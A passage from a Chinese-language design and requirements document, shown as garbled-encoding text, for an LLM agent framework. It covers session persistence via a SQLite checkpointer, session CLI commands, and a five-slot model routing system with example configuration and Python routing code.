| æ–‡ä»¶æœç´¢ | `generalAgent/tools/builtin/search_file.py` | å…¨æ–‡æœç´¢+ç´¢å¼• |
| æ–‡æ¡£æå–å™¨ | `generalAgent/utils/document_extractors.py` | PDF/DOCX/XLSX/PPTXè§£æ |
| æ–‡æœ¬ç´¢å¼•å™¨ | `generalAgent/utils/text_indexer.py` | FTS5ç´¢å¼•æ„å»º |
| ç´¢å¼•ç®¡ç†å™¨ | `generalAgent/utils/text_indexer.py:TextIndexManager` | MD5å»é‡ã€è‡ªåŠ¨æ¸…ç† |

---

## åä¸€ã€ä¼šè¯ç®¡ç†

### äº§å“å®šä½

ä¼šè¯ç®¡ç†æ˜¯æ¡†æ¶çš„æŒä¹…åŒ–å±‚,è´Ÿè´£ä¿å­˜å’Œæ¢å¤å®Œæ•´çš„å¯¹è¯çŠ¶æ€,æ”¯æŒæ–­ç‚¹ç»­èŠã€å¤šä¼šè¯å¹¶å‘ã€å¿«é€Ÿåˆ‡æ¢ã€‚é€šè¿‡SQLite Checkpointerå®ç°è½»é‡çº§æŒä¹…åŒ–,æ¢å¤æ—¶é—´<500msã€‚

### ä¸»è¦åŠŸèƒ½

ä¼šè¯ç®¡ç†çš„è¯¦ç»†åŠŸèƒ½å·²åœ¨ **å…­ã€ä¸Šä¸‹æ–‡ç®¡ç†** ç« èŠ‚ä¸­æ¶µç›–:

- **ä¼šè¯æŒä¹…åŒ–** â†’ å‚è§ **å…­ã€ä¸Šä¸‹æ–‡ç®¡ç† - éœ€æ±‚3: ä¼šè¯æŒä¹…åŒ–** (ç¬¬2933-2970è¡Œ)
  - SQLiteå­˜å‚¨å®Œæ•´AppState
  - æ”¯æŒ1000+å¹¶å‘ä¼šè¯
  - æ¢å¤æ—¶é—´<500ms
  - CLIå‘½ä»¤:`/sessions`, `/load`, `/reset`, `/current`

- **æ–­ç‚¹ç»­èŠ** â†’ å‚è§ **å…­ã€ä¸Šä¸‹æ–‡ç®¡ç† - åœºæ™¯2: ä¼šè¯æ–­ç‚¹ç»­èŠ** (ç¬¬2842-2870è¡Œ)
  - å®Œæ•´çŠ¶æ€æ¢å¤:messages, tools, skills, workspace
  - è·¨è®¾å¤‡ç»­èŠ(å…±äº«data/sessions.db)
  - è‡ªåŠ¨ä¿å­˜ç­–ç•¥(æ¯è½®å¯¹è¯å)

### æ ¸å¿ƒç‰¹æ€§

#### CLIå‘½ä»¤

| å‘½ä»¤ | åŠŸèƒ½ | ç¤ºä¾‹ |
|------|------|------|
| `/sessions` | åˆ—å‡ºæ‰€æœ‰ä¿å­˜çš„ä¼šè¯ | æ˜¾ç¤ºsession_id, åˆ›å»ºæ—¶é—´, æ¶ˆæ¯æ•° |
| `/load <id>` | åŠ è½½æŒ‡å®šä¼šè¯ | `/load abc123`(æ”¯æŒå‰ç¼€åŒ¹é…) |
| `/reset` | é‡ç½®å½“å‰ä¼šè¯ | æ¸…ç©ºmessages,ä¿ç•™é…ç½® |
| `/current` | æ˜¾ç¤ºå½“å‰ä¼šè¯ä¿¡æ¯ | session_id, loops, tokenä½¿ç”¨ |
| `/clean` | æ¸…ç†è¿‡æœŸå·¥ä½œåŒº | åˆ é™¤7å¤©ä»¥ä¸Šçš„workspace |

#### æŒä¹…åŒ–æ•°æ®

**å®Œæ•´AppStateä¿å­˜**:
- `messages`: å¯¹è¯å†å²(æ‰€æœ‰æ¶ˆæ¯)
- `mentioned_agents`: @mentionedå·¥å…·/æŠ€èƒ½/agents
- `active_skill`: å½“å‰æ¿€æ´»æŠ€èƒ½
- `workspace_path`: å·¥ä½œåŒºè·¯å¾„
- `uploaded_files`: å·²ä¸Šä¼ æ–‡ä»¶åˆ—è¡¨
- `todos`: ä»»åŠ¡åˆ—è¡¨
- `loops`: å¾ªç¯è®¡æ•°
- `cumulative_prompt_tokens`: Tokenç´¯è®¡ä½¿ç”¨

**ä¸ä¿å­˜**:
- ä¸´æ—¶çŠ¶æ€(needs_compressionç­‰)
- è¿è¡Œæ—¶å¯¹è±¡(model_registryç­‰)

#### æ€§èƒ½æŒ‡æ ‡

| æŒ‡æ ‡ | ç›®æ ‡å€¼ | å®é™…è¡¨ç° |
|------|--------|----------|
| æ¢å¤æ—¶é—´ | <500ms | ~300ms(50æ¡æ¶ˆæ¯) |
| å¹¶å‘ä¼šè¯ | 1000+ | SQLiteæ”¯æŒ |
| å­˜å‚¨ç©ºé—´ | <1MB/ä¼šè¯ | ~500KB(100æ¡æ¶ˆæ¯) |
| æŸ¥è¯¢æ€§èƒ½ | <50ms | ç´¢å¼•ä¼˜åŒ– |

### æŠ€æœ¯å®ç°

#### SQLite Checkpointer

```python
from langgraph.checkpoint.sqlite import SqliteSaver

# åˆ›å»ºcheckpointer
checkpointer = SqliteSaver.from_conn_string("data/sessions.db")

# åº”ç”¨ç»‘å®š
app = builder.compile(checkpointer=checkpointer)

# è¿è¡Œæ—¶é…ç½®
config = {"configurable": {"thread_id": session_id}}
result = await app.ainvoke(initial_state, config=config)
```

#### ä¼šè¯IDç”Ÿæˆ

```python
import uuid

# ç”Ÿæˆå”¯ä¸€session_id
session_id = uuid.uuid4().hex[:12]  # 12å­—ç¬¦,è¶³å¤Ÿå”¯ä¸€

# æˆ–ä½¿ç”¨æ—¶é—´æˆ³+éšæœº
session_id = f"{int(time.time())}-{random.randint(1000, 9999)}"
```

#### å‰ç¼€åŒ¹é…åŠ è½½

```python
def load_session(prefix: str) -> str:
    """æ ¹æ®å‰ç¼€åŒ¹é…åŠ è½½ä¼šè¯

    æ”¯æŒ:
    - /load abc      â†’ åŒ¹é… abc12345678
    - /load abc123   â†’ ç²¾ç¡®åŒ¹é…
    """
    sessions = list_all_sessions()
    matches = [s for s in sessions if s["id"].startswith(prefix)]

    if len(matches) == 0:
        raise ValueError(f"æœªæ‰¾åˆ°åŒ¹é…çš„ä¼šè¯: {prefix}")
    if len(matches) > 1:
        raise ValueError(f"æ‰¾åˆ°å¤šä¸ªåŒ¹é…ä¼šè¯: {[m['id'] for m in matches]}")

    return matches[0]["id"]
```

### ä¸å·¥ä½œåŒºçš„å…³ç³»

**ä¼šè¯ä¸å·¥ä½œåŒºç»‘å®š**:
- æ¯ä¸ªsession_idå¯¹åº”ä¸€ä¸ªworkspace: `data/workspace/{session_id}/`
- åŠ è½½ä¼šè¯æ—¶è‡ªåŠ¨æ¢å¤workspace_path
- å·¥ä½œåŒºç‹¬ç«‹äºä¼šè¯æŒä¹…åŒ–(7å¤©åè‡ªåŠ¨æ¸…ç†)

**æ¸…ç†ç­–ç•¥**:
- ä¼šè¯æ°¸ä¹…ä¿å­˜(é™¤éæ‰‹åŠ¨åˆ é™¤)
- å·¥ä½œåŒº7å¤©è‡ªåŠ¨æ¸…ç†(é‡Šæ”¾ç£ç›˜ç©ºé—´)
- æ¸…ç†æ—¶ä¿ç•™ä¼šè¯è®°å½•(messagesä»å¯æŸ¥çœ‹)

### å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | æ–‡ä»¶è·¯å¾„ | è¯´æ˜ |
|---------|---------|------|
| ä¼šè¯å­˜å‚¨ | `shared/session/store.py` | SessionStoreå®ç° |
| ä¼šè¯ç®¡ç†å™¨ | `shared/session/manager.py` | SessionManagerç”Ÿå‘½å‘¨æœŸ |
| Checkpointer | `generalAgent/persistence/session_store.py` | SQLite Checkpointeré…ç½® |
| CLIå‘½ä»¤ | `shared/cli/base_cli.py` | /sessions, /load, /reset |
| å‰ç¼€åŒ¹é… | `shared/session/manager.py:load_session()` | å‰ç¼€åŒ¹é…é€»è¾‘ |
| å·¥ä½œåŒºæ¸…ç† | `shared/workspace/manager.py:cleanup_old_workspaces()` | 7å¤©è¿‡æœŸæ¸…ç† |

---

**å‚è§å…¶ä»–ç« èŠ‚**:
- å…­ã€ä¸Šä¸‹æ–‡ç®¡ç† - ä¼šè¯æŒä¹…åŒ–è¯¦ç»†å®ç°(ç¬¬2933-2970è¡Œ)
- ä¹ã€å·¥ä½œåŒºç®¡ç† - å·¥ä½œåŒºä¸ä¼šè¯çš„å…³ç³»(ç¬¬3276-3315è¡Œ)

---

## ä¸ƒã€æ¨¡å‹è·¯ç”±ç³»ç»Ÿ

### äº§å“å®šä½

æ¨¡å‹è·¯ç”±ç³»ç»Ÿæ˜¯æ¡†æ¶çš„æ™ºèƒ½è°ƒåº¦å±‚,è´Ÿè´£æ ¹æ®ä»»åŠ¡ç‰¹å¾(å›¾åƒè¾“å…¥ã€ä»£ç ç”Ÿæˆã€å¤æ‚æ¨ç†)è‡ªåŠ¨é€‰æ‹©æœ€åˆé€‚çš„æ¨¡å‹æ§½ä½ã€‚é€šè¿‡äº”ç§æ¨¡å‹æ§½ä½(base/reason/vision/code/chat)å’Œå¯å‘å¼è·¯ç”±ç­–ç•¥,å®ç°æˆæœ¬ä¸æ€§èƒ½çš„æœ€ä¼˜å¹³è¡¡ã€‚

**ä»·å€¼ä¸»å¼ **:
- **æ™ºèƒ½é€‰æ‹©**:è‡ªåŠ¨æ£€æµ‹ä»»åŠ¡ç±»å‹,åŒ¹é…æœ€ä½³æ¨¡å‹(å¦‚æ£€æµ‹åˆ°å›¾ç‰‡è‡ªåŠ¨ä½¿ç”¨visionæ¨¡å‹)
- **æˆæœ¬ä¼˜åŒ–**:å¿«é€Ÿä»»åŠ¡ä½¿ç”¨baseæ¨¡å‹,å¤æ‚æ¨ç†ä½¿ç”¨reasonæ¨¡å‹,æŒ‰éœ€åˆ†é…
- **çµæ´»é…ç½®**:é€šè¿‡.envæ–‡ä»¶é…ç½®ä¸åŒä¾›åº”å•†æ¨¡å‹(DeepSeek/Moonshot/GLMç­‰)
- **ç»Ÿä¸€æ¥å£**:ModelResolveræŠ½è±¡å±è”½æ¨¡å‹å·®å¼‚,æ”¯æŒOpenAI-compatible API

---

### æ ¸å¿ƒåœºæ™¯

#### åœºæ™¯ 1:è‡ªåŠ¨å¤šæ¨¡æ€åˆ‡æ¢

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·ä¸Šä¼ ä¸€å¼ æ¶æ„å›¾å¹¶è¯¢é—®:"è¿™ä¸ªç³»ç»Ÿçš„ç“¶é¢ˆåœ¨å“ªé‡Œ?"

**ç³»ç»Ÿè¡Œä¸º**:
1. PlannerèŠ‚ç‚¹æ£€æµ‹åˆ°æœ€è¿‘3æ¡æ¶ˆæ¯ä¸­æœ‰å›¾ç‰‡(image_urlç±»å‹)
2. `_detect_multimodal_input()`è¿”å›`need_vision=True`
3. ModelRegistryé€‰æ‹©visionæ§½ä½æ¨¡å‹(å¦‚glm-4.5v)
4. Agentä½¿ç”¨å¤šæ¨¡æ€æ¨¡å‹åˆ†æå›¾ç‰‡å†…å®¹
5. è¿”å›åˆ†æç»“æœ,åŒ…å«å¯¹æ¶æ„å›¾çš„ç†è§£

**å…³é”®ç‚¹**:
- è‡ªåŠ¨æ£€æµ‹å›¾ç‰‡,æ— éœ€ç”¨æˆ·æŒ‡å®š
- Visionä¼˜å…ˆç­–ç•¥(å³ä½¿ä¸éœ€è¦å·¥å…·è°ƒç”¨ä¹Ÿä½¿ç”¨visionæ¨¡å‹)
- æ”¯æŒimage/image_urlä¸¤ç§æ ¼å¼

---

#### åœºæ™¯ 2:ä»£ç ç”Ÿæˆä¸“ç”¨æ¨¡å‹

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·è¯·æ±‚:"å¸®æˆ‘ç”Ÿæˆä¸€ä¸ªReactç»„ä»¶,å®ç°æ‹–æ‹½æ’åºåŠŸèƒ½"

**ç³»ç»Ÿè¡Œä¸º**:
1. PlannerèŠ‚ç‚¹è°ƒç”¨`invoke_planner(need_code=True)`
2. ModelRegistryé€‰æ‹©codeæ§½ä½æ¨¡å‹(å¦‚deepseek-chat)
3. Agentä½¿ç”¨ä»£ç ä¸“ç”¨æ¨¡å‹ç”Ÿæˆé«˜è´¨é‡ä»£ç 
4. é€šè¿‡write_fileå·¥å…·ä¿å­˜ä»£ç åˆ°workspace

**å…³é”®ç‚¹**:
- ä»£ç ç”Ÿæˆä»»åŠ¡ä½¿ç”¨ä¸“ç”¨æ¨¡å‹(æ›´é«˜è´¨é‡)
- Codeæ¨¡å‹æ”¯æŒå·¥å…·è°ƒç”¨(can_tools=True)
- é€Ÿåº¦å’Œè´¨é‡å¹³è¡¡(speed=normal, quality=high)

---

#### åœºæ™¯ 3:å¤æ‚æ¨ç†ä»»åŠ¡

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·è¯¢é—®:"åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆè¿™ä¸ªç®—æ³•ä¼šè¶…æ—¶,ç»™å‡º3ç§ä¼˜åŒ–æ–¹æ¡ˆå¹¶è¯„ä¼°å¤æ‚åº¦"

**ç³»ç»Ÿè¡Œä¸º**:
1. ç”¨æˆ·å¯é€‰æ‹©ä½¿ç”¨@reasoningæ ‡è®°æˆ–ç³»ç»Ÿè‡ªåŠ¨æ£€æµ‹
2. Plannerè°ƒç”¨`invoke_planner(preference='reasoning')`
3. ModelRegistryé€‰æ‹©reasonæ§½ä½æ¨¡å‹(å¦‚deepseek-reasoner)
4. Agentè¿›è¡Œæ·±åº¦æ€è€ƒé“¾æ¨ç†
5. è¿”å›è¯¦ç»†çš„åˆ†æå’Œä¼˜åŒ–æ–¹æ¡ˆ

**å…³é”®ç‚¹**:
- Reasoningæ¨¡å‹ä¸“æ³¨å¤æ‚ä»»åŠ¡(domain=reasoning)
- æ”¯æŒå·¥å…·è°ƒç”¨(can_tools=True)
- æ›´é«˜è´¨é‡ä½†é€Ÿåº¦è¾ƒæ…¢(speed=slow, quality=high)

---

### åŠŸèƒ½éœ€æ±‚

#### éœ€æ±‚ 1:äº”ç§æ¨¡å‹æ§½ä½å®šä¹‰

**åŠŸèƒ½æè¿°**:
ç³»ç»Ÿæ”¯æŒäº”ç§æ¨¡å‹æ§½ä½,æ¯ç§æ§½ä½å¯¹åº”ç‰¹å®šèƒ½åŠ›å’Œä½¿ç”¨åœºæ™¯ã€‚

**æ¨¡å‹æ§½ä½**:

| æ§½ä½ | èƒ½åŠ› | å¤šæ¨¡æ€ | å·¥å…·è°ƒç”¨ | é¢†åŸŸ | é€Ÿåº¦ | è´¨é‡ | ä½¿ç”¨åœºæ™¯ |
|------|------|--------|----------|------|------|------|----------|
| base | é€šç”¨ | âŒ | âŒ | general | fast | low | å¿«é€Ÿå“åº”ã€ç®€å•ä»»åŠ¡ |
| reason | æ¨ç† | âŒ | âœ… | reasoning | slow | high | å¤æ‚é€»è¾‘ã€æ·±åº¦åˆ†æ |
| vision | è§†è§‰ | âœ… | âŒ | general | normal | med | å›¾ç‰‡åˆ†æã€å¤šæ¨¡æ€ |
| code | ä»£ç  | âŒ | âœ… | code | normal | high | ä»£ç ç”Ÿæˆã€å®¡æŸ¥ |
| chat | å¯¹è¯ | âŒ | âœ… | chat | normal | med | ä¸»å¯¹è¯æµç¨‹ |

**é…ç½®ç¤ºä¾‹**(.env):
```bash
# Baseæ¨¡å‹ - å¿«é€Ÿå“åº”
MODEL_BASIC_ID=deepseek-chat
MODEL_BASIC_API_KEY=sk-xxx
MODEL_BASIC_BASE_URL=https://api.deepseek.com
MODEL_BASE_CONTEXT_WINDOW=128000
MODEL_BASE_MAX_COMPLETION_TOKENS=2048

# Reasoningæ¨¡å‹ - å¤æ‚æ¨ç†
MODEL_REASONING_ID=deepseek-reasoner
MODEL_REASONING_API_KEY=sk-xxx
MODEL_REASONING_CONTEXT_WINDOW=64000
MODEL_REASONING_MAX_COMPLETION_TOKENS=8000

# Visionæ¨¡å‹ - å¤šæ¨¡æ€
MODEL_MULTIMODAL_ID=glm-4.5v
MODEL_MULTIMODAL_API_KEY=xxx
MODEL_MULTIMODAL_BASE_URL=https://open.bigmodel.cn/api/paas/v4
MODEL_VISION_CONTEXT_WINDOW=128000

# Codeæ¨¡å‹ - ä»£ç ç”Ÿæˆ
MODEL_CODE_ID=deepseek-chat
MODEL_CODE_API_KEY=sk-xxx
MODEL_CODE_CONTEXT_WINDOW=128000

# Chatæ¨¡å‹ - ä¸»å¯¹è¯
MODEL_CHAT_ID=kimi-k2-0905-preview
MODEL_CHAT_API_KEY=xxx
MODEL_CHAT_BASE_URL=https://api.moonshot.cn/v1
MODEL_CHAT_CONTEXT_WINDOW=256000
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… äº”ç§æ§½ä½å‡å¯ç‹¬ç«‹é…ç½®model_idã€api_keyã€base_url
- âœ… æ¯ä¸ªæ§½ä½æ”¯æŒcontext_windowå’Œmax_completion_tokensé…ç½®
- âœ… æ”¯æŒå¤šç§åˆ«å(å¦‚MODEL_BASIC_*/MODEL_BASE_*å‡å¯)
- âœ… ç¼ºå°‘API Keyæ—¶æŠ›å‡ºæ¸…æ™°é”™è¯¯æç¤º

---

#### éœ€æ±‚ 2:ModelSpecæ¨¡å‹è§„æ ¼å®šä¹‰

**åŠŸèƒ½æè¿°**:
ä½¿ç”¨ModelSpecæ•°æ®ç±»æ ‡å‡†åŒ–æ¨¡å‹å…ƒæ•°æ®,åŒ…å«èƒ½åŠ›æ ‡è®°ã€æ€§èƒ½ç‰¹å¾ã€ä¸Šä¸‹æ–‡çª—å£ã€‚

**æ•°æ®ç»“æ„**:
```python
@dataclass(frozen=True, slots=True)
class ModelSpec:
    key: ModelKey              # æ§½ä½æ ‡è¯†(base/reason/vision/code/chat)
    model_id: str              # å®é™…æ¨¡å‹ID(å¦‚deepseek-chat)
    can_tools: bool            # æ˜¯å¦æ”¯æŒå·¥å…·è°ƒç”¨
    multimodal: bool           # æ˜¯å¦æ”¯æŒå¤šæ¨¡æ€(å›¾ç‰‡)
    domain: str                # é¢†åŸŸ(general/reasoning/code/chat)
    speed: str                 # é€Ÿåº¦(fast/normal/slow)
    quality: str               # è´¨é‡(low/med/high)
    context_window: int        # ä¸Šä¸‹æ–‡çª—å£å¤§å°(tokens)
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… ModelSpecä¸ºfrozen dataclass(ä¸å¯å˜)
- âœ… åŒ…å«8ä¸ªå­—æ®µ,æ¶µç›–æ¨¡å‹æ‰€æœ‰å…³é”®å±æ€§
- âœ… æ”¯æŒé€šè¿‡ModelRegistry.get(key)æŸ¥è¯¢
- âœ… ç”¨äºModelRegistryè·¯ç”±å†³ç­–

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/models/registry.py:11-23` - ModelSpecå®šä¹‰
- `generalAgent/models/registry.py:73-135` - build_default_registry()

---

#### éœ€æ±‚ 3:ModelRegistryæ³¨å†Œä¸è·¯ç”±

**åŠŸèƒ½æè¿°**:
ModelRegistryè´Ÿè´£å­˜å‚¨æ‰€æœ‰ModelSpec,å¹¶æä¾›å¯å‘å¼è·¯ç”±ç­–ç•¥é€‰æ‹©æœ€ä½³æ¨¡å‹ã€‚

**æ ¸å¿ƒæ–¹æ³•**:

**3.1 register(spec: ModelSpec)**
- æ³¨å†ŒModelSpecåˆ°å†…éƒ¨å­—å…¸
- ä½¿ç”¨key(base/reason/vision/code/chat)ä½œä¸ºç´¢å¼•

**3.2 get(key: ModelKey) -> ModelSpec**
- æ ¹æ®keyæŸ¥è¯¢ModelSpec
- ä¸å­˜åœ¨æ—¶æŠ›å‡ºKeyError

**3.3 prefer(...) -> ModelSpec** (æ ¸å¿ƒè·¯ç”±é€»è¾‘)
- æ ¹æ®ä»»åŠ¡ç‰¹å¾é€‰æ‹©æœ€ä½³æ¨¡å‹
- å‚æ•°:
  - `phase`: æ‰§è¡Œé˜¶æ®µ(plan/delegate)
  - `require_tools`: æ˜¯å¦éœ€è¦å·¥å…·è°ƒç”¨
  - `need_code`: æ˜¯å¦ä»£ç ç”Ÿæˆä»»åŠ¡
  - `need_vision`: æ˜¯å¦éœ€è¦å¤„ç†å›¾ç‰‡
  - `preference`: ç”¨æˆ·åå¥½(reasoningç­‰)

**è·¯ç”±ç­–ç•¥**:
```python
# ä¼˜å…ˆçº§1: Visionä¼˜å…ˆ(æ£€æµ‹åˆ°å›¾ç‰‡ä¸”ä¸éœ€å·¥å…·)
if need_vision and not require_tools:
    return get("vision")

# ä¼˜å…ˆçº§2: å·¥å…·è°ƒç”¨åœºæ™¯
if require_tools:
    if need_code:
        return get("code")       # ä»£ç ç”Ÿæˆ
    if preference == "reasoning":
        return get("reason")     # å¤æ‚æ¨ç†
    return get("chat")           # é»˜è®¤å¯¹è¯

# ä¼˜å…ˆçº§3: æ— å·¥å…·åœºæ™¯
if preference == "reasoning":
    return get("reason")         # æ¨ç†åå¥½
return get("base")               # é»˜è®¤å¿«é€Ÿæ¨¡å‹
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… å›¾ç‰‡è¾“å…¥è‡ªåŠ¨è§¦å‘visionæ¨¡å‹
- âœ… ä»£ç ä»»åŠ¡è‡ªåŠ¨é€‰æ‹©codeæ¨¡å‹
- âœ… æ”¯æŒpreferenceå‚æ•°è¦†ç›–é»˜è®¤é€‰æ‹©
- âœ… è·¯ç”±é€»è¾‘ç¨³å®šå¯é¢„æµ‹

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/models/registry.py:25-71` - ModelRegistryå®ç°
- `generalAgent/models/registry.py:46-70` - prefer()è·¯ç”±é€»è¾‘

---

#### éœ€æ±‚ 4:ModelResolveræ¨¡å‹å®ä¾‹åŒ–

**åŠŸèƒ½æè¿°**:
ModelResolveræ˜¯ä¸€ä¸ªåè®®(Protocol),è´Ÿè´£æ ¹æ®model_idè¿”å›LangChainå…¼å®¹çš„ChatOpenAIå®ä¾‹ã€‚é‡‡ç”¨æƒ°æ€§å®ä¾‹åŒ–ç­–ç•¥,ä»…åœ¨ä½¿ç”¨æ—¶åˆ›å»ºæ¨¡å‹å¯¹è±¡ã€‚

**æ¥å£å®šä¹‰**:
```python
class ModelResolver(Protocol):
    def __call__(self, model_id: str) -> ChatOpenAI:
        ...
```

**å®ç°æµç¨‹**:
1. `resolve_model_configs(settings)` - ä».envæå–äº”ä¸ªæ§½ä½é…ç½®
2. `build_model_resolver(configs)` - æ„å»ºresolverå‡½æ•°
3. è¿”å›resolver:æ ¹æ®model_idåˆ›å»ºChatOpenAIå®ä¾‹

**é…ç½®è½¬æ¢**:
```python
# .envé…ç½®
MODEL_CHAT_ID=kimi-k2-0905-preview
MODEL_CHAT_API_KEY=sk-xxx
MODEL_CHAT_BASE_URL=https://api.moonshot.cn/v1
MODEL_CHAT_MAX_TOKENS=4096

# è½¬æ¢ä¸ºModelConfig
{
    "chat": {
        "id": "kimi-k2-0905-preview",
        "api_key": "sk-xxx",
        "base_url": "https://api.moonshot.cn/v1",
        "context_window": 256000,
        "max_completion_tokens": 4096
    }
}

# resolverè°ƒç”¨
model = resolver("kimi-k2-0905-preview")
# è¿”å›: ChatOpenAI(model="kimi-k2-0905-preview", api_key="...", base_url="...")
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒè‡ªå®šä¹‰base_url(OpenAI-compatible API)
- âœ… ç¼ºå°‘API Keyæ—¶æŠ›å‡ºRuntimeErrorå¹¶ç»™å‡ºæ¸…æ™°æç¤º
- âœ… æ”¯æŒmodel_idä¸åœ¨é…ç½®ä¸­æ—¶çš„KeyError
- âœ… æƒ°æ€§å®ä¾‹åŒ–(ä»…åœ¨è°ƒç”¨æ—¶åˆ›å»ºå¯¹è±¡)

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/agents/interfaces.py:8-12` - ModelResolveråè®®å®šä¹‰
- `generalAgent/runtime/model_resolver.py:55-108` - resolve_model_configs()
- `generalAgent/runtime/model_resolver.py:143-177` - build_model_resolver()

---

#### éœ€æ±‚ 5:è‡ªåŠ¨å¤šæ¨¡æ€æ£€æµ‹

**åŠŸèƒ½æè¿°**:
PlannerèŠ‚ç‚¹åœ¨è°ƒç”¨LLMå‰è‡ªåŠ¨æ£€æµ‹æœ€è¿‘æ¶ˆæ¯ä¸­çš„å›¾ç‰‡å’Œä»£ç ,è®¾ç½®need_vision/need_codeæ ‡å¿—ã€‚

**æ£€æµ‹é€»è¾‘**:
```python
def _detect_multimodal_input(messages: List[BaseMessage]) -> tuple[bool, bool]:
    has_images = False
    has_code = False

    # æ£€æŸ¥æœ€è¿‘3æ¡æ¶ˆæ¯
    for msg in messages[-3:]:
        content = getattr(msg, "content", "")

        # æ£€æµ‹å›¾ç‰‡(listæ ¼å¼,typeä¸ºimageæˆ–image_url)
        if isinstance(content, list):
            for item in content:
                if isinstance(item, dict):
                    if item.get("type") in ("image", "image_url"):
                        has_images = True

    return has_images, has_code
```

**è°ƒç”¨æ—¶æœº**:
```python
# PlannerèŠ‚ç‚¹è°ƒç”¨LLMå‰
has_images, has_code = _detect_multimodal_input(state["messages"])

response = await invoke_planner(
    model_registry=model_registry,
    model_resolver=model_resolver,
    tools=visible_tools,
    messages=messages,
    need_code=has_code,
    need_vision=has_images,
    preference=None
)
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ£€æµ‹æœ€è¿‘3æ¡æ¶ˆæ¯(è¦†ç›–ç”¨æˆ·è¾“å…¥+Agentå“åº”å‘¨æœŸ)
- âœ… æ”¯æŒimageå’Œimage_urlä¸¤ç§æ ¼å¼
- âœ… æ£€æµ‹ç»“æœç›´æ¥ä¼ é€’ç»™invoke_planner()
- âœ… Visionä¼˜å…ˆç­–ç•¥åœ¨è·¯ç”±ä¸­ç”Ÿæ•ˆ

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/graph/nodes/planner.py:41-67` - _detect_multimodal_input()
- `generalAgent/graph/nodes/planner.py:200-220` - PlannerèŠ‚ç‚¹è°ƒç”¨

---

#### éœ€æ±‚ 6:invoke_plannerç»Ÿä¸€è°ƒç”¨æ¥å£

**åŠŸèƒ½æè¿°**:
æä¾›ç»Ÿä¸€çš„LLMè°ƒç”¨æ¥å£,å°è£…ModelRegistryæŸ¥è¯¢ã€ModelResolverå®ä¾‹åŒ–ã€å·¥å…·ç»‘å®šæµç¨‹ã€‚

**å‡½æ•°ç­¾å**:
```python
async def invoke_planner(
    *,
    model_registry: ModelRegistry,
    model_resolver: ModelResolver,
    tools: Iterable[BaseTool],
    messages: List[BaseMessage],
    need_code: bool = False,
    need_vision: bool = False,
    preference: str | None = None,
) -> AIMessage:
```

**æ‰§è¡Œæµç¨‹**:
1. è°ƒç”¨`model_registry.prefer()`è·å–ModelSpec
2. ä½¿ç”¨`model_resolver(spec.model_id)`åˆ›å»ºæ¨¡å‹å®ä¾‹
3. ç»‘å®šå·¥å…·:`model.bind_tools(list(tools))`
4. è°ƒç”¨æ¨¡å‹:`await runnable.ainvoke(messages)`
5. è¿”å›AIMessage(åŒ…å«tool_calls)

**ä½¿ç”¨ç¤ºä¾‹**:
```python
# æ™®é€šå¯¹è¯
response = await invoke_planner(
    model_registry=registry,
    model_resolver=resolver,
    tools=visible_tools,
    messages=state["messages"]
)

# ä»£ç ç”Ÿæˆ
response = await invoke_planner(
    model_registry=registry,
    model_resolver=resolver,
    tools=visible_tools,
    messages=state["messages"],
    need_code=True
)

# å¤æ‚æ¨ç†
response = await invoke_planner(
    model_registry=registry,
    model_resolver=resolver,
    tools=visible_tools,
    messages=state["messages"],
    preference="reasoning"
)
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ‰€æœ‰æ¨¡å‹è°ƒç”¨ç»Ÿä¸€ç»è¿‡æ­¤æ¥å£
- âœ… è‡ªåŠ¨å¤„ç†æ¨¡å‹é€‰æ‹©å’Œå®ä¾‹åŒ–
- âœ… æ”¯æŒå¼‚æ­¥è°ƒç”¨(async/await)
- âœ… è¿”å›æ ‡å‡†AIMessageæ ¼å¼

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/agents/factory.py:15-36` - invoke_planner()å®ç°
- `generalAgent/agents/factory.py:39-58` - invoke_subagent()(ç±»ä¼¼é€»è¾‘)

---

#### éœ€æ±‚ 7:Subagentæ¨¡å‹ç»§æ‰¿

**åŠŸèƒ½æè¿°**:
delegated subagentä½¿ç”¨ç‹¬ç«‹çš„invoke_subagent()æ¥å£,ä½†å¤ç”¨ç›¸åŒçš„ModelRegistryå’ŒModelResolverã€‚

**ä¸ä¸»Agentçš„å·®å¼‚**:
- ä½¿ç”¨`phase="delegate"`(è€Œé"plan")
- ä¸æ”¯æŒpreferenceå‚æ•°(ç®€åŒ–é€»è¾‘)
- å…¶ä»–è·¯ç”±é€»è¾‘ç›¸åŒ(visionä¼˜å…ˆã€codeæ£€æµ‹ç­‰)

**è°ƒç”¨ç¤ºä¾‹**:
```python
# SubagentèŠ‚ç‚¹
response = await invoke_subagent(
    model_registry=model_registry,
    model_resolver=model_resolver,
    tools=subagent_tools,
    messages=subagent_messages,
    need_code=has_code,
    need_vision=has_images
)
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… Subagentä¸ä¸»Agentä½¿ç”¨ç›¸åŒçš„æ¨¡å‹é…ç½®
- âœ… æ”¯æŒneed_codeå’Œneed_visionå‚æ•°
- âœ… ä¸æ”¯æŒpreferenceå‚æ•°
- âœ… Phaseæ ‡è®°ä¸º"delegate"ä¾¿äºè§‚æµ‹

**å‚è€ƒä»£ç ä½ç½®**:
- `generalAgent/agents/factory.py:39-58` - invoke_subagent()
- `generalAgent/graph/nodes/planner.py:300-350` - SubagentèŠ‚ç‚¹è°ƒç”¨

---

### éåŠŸèƒ½éœ€æ±‚

#### NFR-MODEL-1:æˆæœ¬ä¼˜åŒ–

**è¦æ±‚**:
- baseæ¨¡å‹ç”¨äºå¿«é€Ÿä»»åŠ¡,é™ä½80%æˆæœ¬
- reasonæ¨¡å‹ä»…åœ¨å¤æ‚æ¨ç†æ—¶ä½¿ç”¨
